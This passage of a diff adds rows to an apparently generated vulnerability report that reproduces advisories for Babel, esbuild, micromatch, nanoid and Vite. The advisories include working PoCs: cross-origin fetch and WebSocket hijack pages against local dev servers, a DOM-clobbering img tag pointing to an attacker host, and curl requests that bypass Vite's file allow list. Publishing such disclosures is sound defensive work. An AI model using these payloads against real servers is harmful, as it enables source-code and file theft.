Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</span><br><br>You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).<br><br><br>### Patches<br><br>This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It&amp;#39;s likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.<br><br>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.<br><br>### Workarounds<br><br>If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$&amp;lt;` if it&amp;#39;s then not followed by `&amp;gt;` (possibly with other characters in between).<br><br>### References<br><br>This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-27789<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2025-27789</span><br><span class="vuln-link">https://github.com/babel/babel/pull/17173</span><br><span class="vuln-link">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</span><br><span class="vuln-link">https://github.com/babel/babel</span><br><br><div class="section-header">影响范围: </div><br>@babel/helpers: 所有版本 &lt; 7.26.10 <br>@babel/runtime: 所有版本 &lt; 7.26.10 <br>@babel/runtime-corejs2: 所有版本 &lt; 7.26.10 <br>@babel/runtime-corejs3: 所有版本 &lt; 7.26.10 <br>@babel/helpers: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime-corejs2: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime-corejs3: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br><br><br><div class="cve-header">来自 CVE-2025-27789 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-67mh-4wv8-2f99</td>
+                            <td>### Summary<br><br>esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.<br><br>### Details<br><br>esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.<br><br>https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121<br>https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363<br><br>**Attack scenario**:<br><br>1. The attacker serves a malicious web page (`http://malicious.example.com`).<br>1. The user accesses the malicious web page.<br>1. The attacker sends a `fetch(&amp;#39;http://127.0.0.1:8000/main.js&amp;#39;)` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that&amp;#39;s not the case for the reasons above.<br>1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.<br><br>In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by<br><br>Fetching `/index.html`: normally you have a script tag here<br>Fetching `/assets`: it&amp;#39;s common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files<br>Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource(&amp;#39;/esbuild&amp;#39;).addEventListener(&amp;#39;change&amp;#39;, e =&amp;gt; console.log(e.type, e.data))`)<br>Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file<br><br>The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.<br><br>### PoC<br><br>1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)<br>2. Extract it and move to that directory<br>1. Run `npm i`<br>1. Run `npm run watch`<br>1. Run `fetch(&amp;#39;http://127.0.0.1:8000/app.js&amp;#39;).then(r =&amp;gt; r.text()).then(content =&amp;gt; console.log(content))` in a different website&amp;#39;s dev tools.<br><br>![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)<br><br>### Impact<br><br>Users using the serve feature may get the source code stolen by malicious websites.<br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99</span><br><span class="vuln-link">https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d</span><br><span class="vuln-link">https://github.com/evanw/esbuild</span><br><br><div class="section-header">影响范围: </div><br>esbuild: 所有版本 &lt; 0.25.0 <br></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv</td>
+                            <td>The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&amp;#39;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won&amp;#39;t start backtracking the regular expression due to greedy matching.<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-4067<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-4067</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/issues/243</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/pull/247</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/pull/266</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</span><br><span class="vuln-link">https://advisory.checkmarx.net/advisory/CVE-2024-4067</span><br><span class="vuln-link">https://devhub.checkmarx.com/cve-details/CVE-2024-4067</span><br><span class="vuln-link">https://github.com/micromatch/micromatch</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/releases/tag/4.0.8</span><br><br><div class="section-header">影响范围: </div><br>micromatch: 所有版本 &lt; 4.0.8 <br><br><br><div class="cve-header">来自 CVE-2024-4067 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55</td>
+                            <td>When nanoid is called with a fractional value, there were a number of undesirable effects:<br><br>1. in browser and non-secure, the code infinite loops on while (size--)<br>2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled<br>3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error<br><br>Version 3.3.8 and 5.0.9 are fixed.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-55565<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-55565</span><br><span class="vuln-link">https://github.com/ai/nanoid/pull/510</span><br><span class="vuln-link">https://github.com/ai/nanoid</span><br><span class="vuln-link">https://github.com/ai/nanoid/compare/3.3.7...3.3.8</span><br><span class="vuln-link">https://github.com/ai/nanoid/releases/tag/5.0.9</span><br><br><div class="section-header">影响范围: </div><br>nanoid: &gt;= 4.0.0 &lt; 5.0.9 <br>nanoid: 所有版本 &lt; 3.3.8 <br><br><br><div class="cve-header">来自 CVE-2024-55565 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-64vr-g452-qvp3</td>
+                            <td>### Summary<br><br>We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.<br><br>Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986<br><br>### Details<br><br>**Backgrounds**<br><br>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:<br><br>[1] https://scnps.co/papers/sp23_domclob.pdf<br>[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/<br><br>**Gadgets found in Vite**<br><br>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.<br><br>However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&amp;#39;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.<br><br>```<br>const relativeUrlMechanisms = {<br>  amd: (relativePath) =&amp;gt; {<br>    if (relativePath[0] !== &amp;quot;.&amp;quot;) relativePath = &amp;quot;./&amp;quot; + relativePath;<br>    return getResolveUrl(<br>      `require.toUrl(&amp;#39;${escapeId(relativePath)}&amp;#39;), document.baseURI`<br>    );<br>  },<br>  cjs: (relativePath) =&amp;gt; `(typeof document === &amp;#39;undefined&amp;#39; ? ${getFileUrlFromRelativePath(<br>    relativePath<br>  )} : ${getRelativeUrlFromDocument(relativePath)})`,<br>  es: (relativePath) =&amp;gt; getResolveUrl(<br>    `&amp;#39;${escapeId(partialEncodeURIPath(relativePath))}&amp;#39;, import.meta.url`<br>  ),<br>  iife: (relativePath) =&amp;gt; getRelativeUrlFromDocument(relativePath),<br>  // NOTE: make sure rollup generate `module` params<br>  system: (relativePath) =&amp;gt; getResolveUrl(<br>    `&amp;#39;${escapeId(partialEncodeURIPath(relativePath))}&amp;#39;, module.meta.url`<br>  ),<br>  umd: (relativePath) =&amp;gt; `(typeof document === &amp;#39;undefined&amp;#39; &amp;amp;&amp;amp; typeof location === &amp;#39;undefined&amp;#39; ? ${getFileUrlFromRelativePath(<br>    relativePath<br>  )} : ${getRelativeUrlFromDocument(relativePath, true)})`<br>};<br>```<br><br>### PoC<br><br>Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. <br><br>```<br>// main.js<br>import extraURL from &amp;#39;./extra.js?url&amp;#39;<br>var s = document.createElement(&amp;#39;script&amp;#39;)<br>s.src = extraURL<br>document.head.append(s)<br>```<br><br>```<br>// extra.js<br>export default &amp;quot;https://myserver/justAnOther.js&amp;quot;<br>```<br><br>```<br>// vite.config.js<br>import { defineConfig } from &amp;#39;vite&amp;#39;<br><br>export default defineConfig({<br>  build: {<br>    assetsInlineLimit: 0, // To avoid inline assets for PoC<br>    rollupOptions: {<br>      output: {<br>        format: &amp;quot;cjs&amp;quot;<br>      },<br>    },<br>  },<br>  base: &amp;quot;./&amp;quot;,<br>});<br>```<br><br>After running the build command, the developer will get following bundle as the output.<br><br>```<br>// dist/index-DDmIg9VD.js<br>&amp;quot;use strict&amp;quot;;const t=&amp;quot;&amp;quot;+(typeof document&amp;gt;&amp;quot;u&amp;quot;?require(&amp;quot;url&amp;quot;).pathToFileURL(__dirname+&amp;quot;/extra-BLVEx9Lb.js&amp;quot;).href:new URL(&amp;quot;extra-BLVEx9Lb.js&amp;quot;,document.currentScript&amp;amp;&amp;amp;document.currentScript.src||document.baseURI).href);var e=document.createElement(&amp;quot;script&amp;quot;);e.src=t;document.head.append(e);<br>```<br><br>Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&amp;#39;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website&amp;#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.<br><br><br>```<br>&amp;lt;!DOCTYPE html&amp;gt;<br>&amp;lt;html&amp;gt;<br>&amp;lt;head&amp;gt;<br>  &amp;lt;title&amp;gt;Vite Example&amp;lt;/title&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element starts--!&amp;gt;<br>  &amp;lt;img name=&amp;quot;currentScript&amp;quot; src=&amp;quot;https://attacker.controlled.server/&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element ends--!&amp;gt;<br>&amp;lt;/head&amp;gt;<br>&amp;lt;script type=&amp;quot;module&amp;quot; crossorigin src=&amp;quot;/assets/index-DDmIg9VD.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;<br>&amp;lt;body&amp;gt;<br>&amp;lt;/body&amp;gt;<br>&amp;lt;/html&amp;gt;<br>```<br><br>### Impact<br><br>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.<br><br>### Patch<br><br>```<br>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296<br>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&amp;gt;<br>  getResolveUrl(<br>    `&amp;#39;${escapeId(partialEncodeURIPath(relativePath))}&amp;#39;, ${<br>      umd ? `typeof document === &amp;#39;undefined&amp;#39; ? location.href : ` : &amp;#39;&amp;#39;<br>    }document.currentScript &amp;amp;&amp;amp; document.currentScript.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39; &amp;amp;&amp;amp; document.currentScript.src || document.baseURI`,<br>  )<br>```<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-43788<br>CVE-2024-45389<br>CVE-2024-45812<br>GHSA-4vvj-4cpr-p986<br>GHSA-gprj-6m2f-j9hx<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</span><br><span class="vuln-link">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</span><br><span class="vuln-link">https://github.com/vitejs/vite</span><br><span class="vuln-link">https://research.securitum.com/xss-in-amp4email-dom-clobbering</span><br><span class="vuln-link">https://scnps.co/papers/sp23_domclob.pdf</span><br><br><div class="section-header">影响范围: </div><br>vite: &gt;= 5.4.0 &lt; 5.4.6 <br>vite: &gt;= 5.3.0 &lt; 5.3.6 <br>vite: &gt;= 5.2.0 &lt; 5.2.14 <br>vite: &gt;= 4.0.0 &lt; 4.5.4 <br>vite: 所有版本 &lt; 3.2.11 <br>vite: &gt;= 5.0.0 &lt; 5.1.8 <br><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45389 的附加信息:</div><br><br><div class="cve-header">来自 CVE-2024-45812 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-9cwx-2883-4wfx</td>
+                            <td>### Summary<br>The contents of arbitrary files can be returned to the browser.<br><br>### Details<br>`@fs` denies access to files outside of Vite serving allow list. Adding `?import&amp;amp;raw` to the URL bypasses this limitation and returns the file content if it exists.<br><br>### PoC<br>```sh<br>$ npm create vite@latest<br>$ cd vite-project/<br>$ npm install<br>$ npm run dev<br><br>$ echo &amp;quot;top secret content&amp;quot; &amp;gt; /tmp/secret.txt<br><br># expected behaviour<br>$ curl &amp;quot;http://localhost:5173/@fs/tmp/secret.txt&amp;quot;<br><br>    &amp;lt;body&amp;gt;<br>      &amp;lt;h1&amp;gt;403 Restricted&amp;lt;/h1&amp;gt;<br>      &amp;lt;p&amp;gt;The request url &amp;amp;quot;/tmp/secret.txt&amp;amp;quot; is outside of Vite serving allow list.<br><br># security bypassed<br>$ curl &amp;quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;amp;raw&amp;quot;<br>export default &amp;quot;top secret content\n&amp;quot;<br>//# sourceMappingURL=data:application/json;base64,eyJ2...<br>```<br><br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-45811<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-45811</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</span><br><span class="vuln-link">https://github.com/vitejs/vite</span><br><br><div class="section-header">影响范围: </div><br>vite: &gt;= 5.4.0 &lt; 5.4.6 <br>vite: &gt;= 5.3.0 &lt; 5.3.6 <br>vite: &gt;= 5.2.0 &lt; 5.2.14 <br>vite: &gt;= 4.0.0 &lt; 4.5.4 <br>vite: 所有版本 &lt; 3.2.11 <br>vite: &gt;= 5.0.0 &lt; 5.1.8 <br><br><br><div class="cve-header">来自 CVE-2024-45811 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-vg6x-rcgg-rjx6</td>
+                            <td>### Summary<br>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.<br><br>&amp;gt; [!WARNING]<br>&amp;gt; This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.<br><br>### Upgrade Path<br>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.<br><br>Using the backend integration feature<br>Using a reverse proxy in front of Vite<br>Accessing the development server via a domain other than `localhost` or `*.localhost`<br>Using a plugin / framework that connects to the WebSocket server on their own from the browser<br><br>#### Using the backend integration feature<br>If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.<br><br>#### Using a reverse proxy in front of Vite<br>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.<br><br>#### Accessing the development server via a domain other than `localhost` or `*.localhost`<br>You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.<br><br>#### Using a plugin / framework that connects to the WebSocket server on their own from the browser<br>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.<br><br>In that case, you can either:<br><br>fix the plugin / framework code to the make it compatible with the new version of Vite<br>set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<br>  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.<br><br>### Mitigation without upgrading Vite<br>#### [1]: Permissive default CORS settings<br>Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.<br><br>#### [2]: Lack of validation on the Origin header for WebSocket connections<br>There aren&amp;#39;t any mitigations for this.<br><br>#### [3]: Lack of validation on the Host header for HTTP requests<br>Use Chrome 94+ or use HTTPS for the development server.<br><br>### Details<br><br>There are three causes that allowed malicious websites to send any requests to the development server:<br><br>#### [1]: Permissive default CORS settings<br><br>Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.<br><br>Attack scenario:<br><br>1. The attacker serves a malicious web page (`http://malicious.example.com`).<br>2. The user accesses the malicious web page.<br>3. The attacker sends a `fetch(&amp;#39;http://127.0.0.1:5173/main.js&amp;#39;)` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that&amp;#39;s not the case for the reasons above.<br>4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.<br><br>#### [2]: Lack of validation on the Origin header for WebSocket connections<br><br>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.<br><br>Attack scenario:<br><br>1. The attacker serves a malicious web page (`http://malicious.example.com`).<br>2. The user accesses the malicious web page.<br>3. The attacker runs `new WebSocket(&amp;#39;http://127.0.0.1:5173&amp;#39;, &amp;#39;vite-hmr&amp;#39;)` by JS in that malicious web page.<br>4. The user edits some files.<br>5. Vite sends some HMR messages over WebSocket.<br>6. The attacker gets the content of the HMR messages.<br><br>#### [3]: Lack of validation on the Host header for HTTP requests<br><br>Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.<br><br>1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won&amp;#39;t work).<br>2. The user accesses the malicious web page.<br>3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).<br>4. The attacker sends a `fetch(&amp;#39;/main.js&amp;#39;)` request by JS in that malicious web page.<br>5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.<br><br>### Impact<br>#### [1]: Permissive default CORS settings<br>Users with the default `server.cors` option may:<br><br>get the source code stolen by malicious websites<br>give the attacker access to functionalities that are not supposed to be exposed externally<br>  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.<br><br>#### [2]: Lack of validation on the Origin header for WebSocket connections<br>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.<br><br>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.<br><br>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.<br><br>#### [3]: Lack of validation on the Host header for HTTP requests<br>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:<br><br>get the source code stolen by malicious websites<br>give the attacker access to functionalities that are not supposed to be exposed externally<br>  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.<br><br>Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.<br><br>### Related Information<br>Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there&amp;#39;s another condition of &amp;quot;the malicious web page is served on HTTP&amp;quot; to make [1] and [2] to work.<br><br>### PoC<br>#### [2]: Lack of validation on the Origin header for WebSocket connections<br>1. I used the `react` template which utilizes HMR functionality.<br><br>```<br>npm create vite@latest my-vue-app-react -- --template react<br>```<br><br>2. Then on a malicious server, serve the following POC html:<br>```html<br>&amp;lt;!doctype html&amp;gt;<br>&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;<br>    &amp;lt;head&amp;gt;<br>        &amp;lt;meta charset=&amp;quot;utf-8&amp;quot; /&amp;gt;<br>        &amp;lt;title&amp;gt;vite CSWSH&amp;lt;/title&amp;gt;<br>    &amp;lt;/head&amp;gt;<br>    &amp;lt;body&amp;gt;<br>        &amp;lt;div id=&amp;quot;logs&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;<br>        &amp;lt;script&amp;gt;<br>            const div = document.querySelectorAll(&amp;#39;#logs&amp;#39;)[0];<br>            const ws = new WebSocket(&amp;#39;ws://localhost:5173&amp;#39;,&amp;#39;vite-hmr&amp;#39;);<br>            ws.onmessage = event =&amp;gt; {<br>                const logLine = document.createElement(&amp;#39;p&amp;#39;);<br>                logLine.innerHTML = event.data;<br>                div.append(logLine);<br>            };<br>        &amp;lt;/script&amp;gt;<br>    &amp;lt;/body&amp;gt;<br>&amp;lt;/html&amp;gt;<br>```<br><br>3. Kick off Vite <br><br>```<br>npm run dev<br>```<br><br>4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. <br>5. Edit `src/App.jsx` file and intentionally place a syntax error<br>6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed<br><br>Here&amp;#39;s a video demonstrating the POC:<br><br>https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-24010<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</span><br><span class="vuln-link">https://github.com/vitejs/vite</span><br><br><div class="section-header">影响范围: </div><br>vite: &gt;= 6.0.0 &lt; 6.0.9 <br>vite: &gt;= 5.0.0 &lt; 5.4.12 <br>vite: 所有版本 &lt; 4.5.6 <br><br><br><div class="cve-header">来自 CVE-2025-24010 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-x574-m823-4x7w</td>
+                            <td>### Summary<br>The contents of arbitrary files can be returned to the browser.<br><br>### Impact<br>Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.<br><br>### Details<br>`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&amp;amp;raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.<br><br>### PoC<br>```bash<br>$ npm create vite@latest<br>$ cd vite-project/<br>$ npm install<br>$ npm run dev<br><br>$ echo &amp;quot;top secret content&amp;quot; &amp;gt; /tmp/secret.txt<br><br># expected behaviour<br>$ curl &amp;quot;http://localhost:5173/@fs/tmp/secret.txt&amp;quot;<br><br>    &amp;lt;body&amp;gt;<br>      &amp;lt;h1&amp;gt;403 Restricted&amp;lt;/h1&amp;gt;<br>      &amp;lt;p&amp;gt;The request url &amp;amp;quot;/tmp/secret.txt&amp;amp;quot; is outside of Vite serving allow list.<br><br># security bypassed<br>$ curl &amp;quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;amp;raw??&amp;quot;<br>export default &amp;quot;top secret content\n&amp;quot;<br>//# sourceMappingURL=data:application/json;base64,eyJ2...<br>```<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-30208<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</span><br><span class="vuln-link">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</span><br><span 